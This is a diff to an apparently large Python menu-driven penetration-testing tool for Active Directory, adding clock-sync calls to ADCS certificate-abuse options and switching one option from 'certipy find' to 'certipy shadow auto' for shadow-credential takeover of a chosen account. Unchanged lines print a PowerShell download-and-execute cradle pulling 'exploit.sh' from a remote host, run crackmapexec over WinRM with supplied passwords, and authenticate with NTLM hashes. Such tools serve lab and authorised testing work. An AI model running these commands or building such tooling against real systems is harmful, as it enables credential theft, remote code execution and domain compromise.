@@ -3728,8 +3728,6 @@ while True:
       else:
          checkParam = test_DOM()                  
       if checkParam != 1:
-         checkParam = test_PRT("5985")            
-      if checkParam != 1:
          print("[i] The following commands may be useful for file uploads...\n")
          localCOM("echo '" + Green + "'")
          print("    IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/exploit.sh')")
@@ -4037,7 +4035,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '239':
+   if selection == '240':
       print("[?] Please enter the command to run:")
       lineCommand = input("\n")
       remoteCOM(lineCommand)
@@ -4757,7 +4755,8 @@ while True:
       if checkParam != 1:
          checkParam = test_DOM()               
       if checkParam != 1:
-         print(colored("[*] Checking ADCS misconfigurations...", colour3))         
+         print(colored("[*] Checking ADCS misconfigurations...", colour3))  
+         SKEW = timeSync(SKEW)       
          if PAS[:2] != "''":      
             remoteCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -vulnerable -stdout") 
          else:
@@ -4779,6 +4778,7 @@ while True:
          checkParams = test_DOM()      
       if checkParams != 1:      
          print(colored("[*] Checking privilges...", colour3))
+         SKEW = timeSync(SKEW)
          remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
          catsFile("priv.tmp")
          with open("priv.tmp") as file:
@@ -4807,6 +4807,7 @@ while True:
 
    if selection =='702':
       print("[!] ESC02 - No Manager Approval Enforcement: Templates require manager approval, but it's not enforced...\n") 
+      SKEW = timeSync(SKEW)
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -4818,7 +4819,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='703':
-      print("[!] ESC03 - Subject Name Supply: Templates allow users to specify the certificate’s Subject Name — impersonation risk...\n") 
+      print("[!] ESC03 - Subject Name Supply: Templates allow users to specify the certificate’s Subject Name — impersonation risk...\n")
+      SKEW = timeSync(SKEW) 
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -4831,6 +4833,7 @@ while True:
 
    if selection =='704':
       print("[!] ESC04 - Dangerous EKUs: Templates include Any Purpose EKU, allowing logon certs from unintended templates...\n") 
+      SKEW = timeSync(SKEW)
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -4843,6 +4846,7 @@ while True:
 
    if selection =='705':
       print("[!] ESC05 - Misconfigured CA ACLs: Weak CA permissions allow attackers to issue or manage templates...\n") 
+      SKEW = timeSync(SKEW)
       prompt() 
 
 # ------------------------------------------------------------------------------------- 
@@ -4855,6 +4859,7 @@ while True:
 
    if selection =='706':
       print("[!] ESC6 - Subordinate CA Abuse: Misconfigurations allow attackers to issue their own certificates as a rogue CA...\n") 
+      SKEW = timeSync(SKEW)
       prompt()          
       
 # ------------------------------------------------------------------------------------- 
@@ -4871,7 +4876,8 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()      
       if checkParams != 1:
-         print(colored("[*] Checking privilges...", colour3))      
+         print(colored("[*] Checking privilges...", colour3))  
+         SKEW = timeSync(SKEW)    
          remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
          catsFile("priv.tmp")
          with open("priv.tmp") as file:
@@ -4910,6 +4916,7 @@ while True:
 
    if selection =='708':
       print("[!] ESC08 - No Security Descriptor: Template has no permissions set — anyone can request certificates...\n") 
+      SKEW = timeSync(SKEW)
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -4922,6 +4929,7 @@ while True:
 
    if selection =='709':
       print("[!] ESC09 - NTAuth Store Injection: Adding rogue CAs to the NTAuth store allows unauthorized cert validation...\n") 
+      SKEW = timeSync(SKEW)
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -4933,7 +4941,8 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='710':
-      print("[!] ESC10 - Unverified SANs at CA Level: CA does not verify SANs, allowing forged identities at issuance...\n") 
+      print("[!] ESC10 - Unverified SANs at CA Level: CA does not verify SANs, allowing forged identities at issuance...\n")
+      SKEW = timeSync(SKEW) 
       prompt()    
       
 # ------------------------------------------------------------------------------------- 
@@ -4946,6 +4955,7 @@ while True:
 
    if selection =='711':
       print("[!] ESC11 - Certificate Renewal Exploit: Allows certificate renewal with modified contents (e.g., new UPN) — impersonation...\n") 
+      SKEW = timeSync(SKEW)
       prompt()       
                             
 # ------------------------------------------------------------------------------------- 
@@ -4958,6 +4968,7 @@ while True:
 
    if selection =='712':
       print("[!] ESC12 - Vulnerable Cross-Forest Trust: Abuse of certificate-based trust between forests to escalate...\n") 
+      SKEW = timeSync(SKEW)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -4970,6 +4981,7 @@ while True:
 
    if selection =='713':
       print("[!] ESC13 - NDES Misconfiguration: Abusing the Network Device Enrollment Service to request certs via MSCEP with spoofed identities...\n") 
+      SKEW = timeSync(SKEW)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -4982,6 +4994,7 @@ while True:
 
    if selection =='714':
       print("[!] ESC14 - Weak Template Duplication Rights: If users can duplicate vulnerable templates and enroll, they can bypass restrictions...\n") 
+      SKEW = timeSync(SKEW)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -4994,6 +5007,7 @@ while True:
 
    if selection =='715':
       print("[!] ESC15 - Certificate Authority Spoofing: Weaknesses in how systems validate certificates issued by rogue/malicious CAs...\n") 
+      SKEW = timeSync(SKEW)
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -5010,11 +5024,13 @@ while True:
       if checkParams != 1:
          checkParams = test_DOM()      
       if checkParams != 1:
-         print(colored("[*] Creating shadow credentials...", colour3))         
+         AD1 = input("[?] Please enter shadow user name: ")
+         print(colored("[*] Creating shadow credentials...", colour3)) 
+         SKEW = timeSync(SKEW)        
          if PAS[:2] != "''":        
-             localCOM("certipy find -u " + USR.rstrip(" ") + "" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -vulnerable")
+             localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -account " +  AD1 + " -dc-ip " + TIP.rstrip(" "))
          else:
-             localCOM("certipy find -u " + USR.rstrip(" ") + "" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -dc-ip " + TIP.rstrip(" ") + " -vulnerable")         
+             localCOM("certipy shadow auto -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " -account " + AD1 + " -dc-ip " + TIP.rstrip(" "))         
       prompt()   
       
 # ------------------------------------------------------------------------------------- 
@@ -5027,6 +5043,7 @@ while True:
 
    if selection =='717':
       print("[!] ESC17 - Orphaned Enrollment Agent Templates: Enrollment Agent templates still usable even if removed from CA config — persistence risk...\n") 
+      SKEW = timeSync(SKEW)
       prompt()         
                
 # Eof...
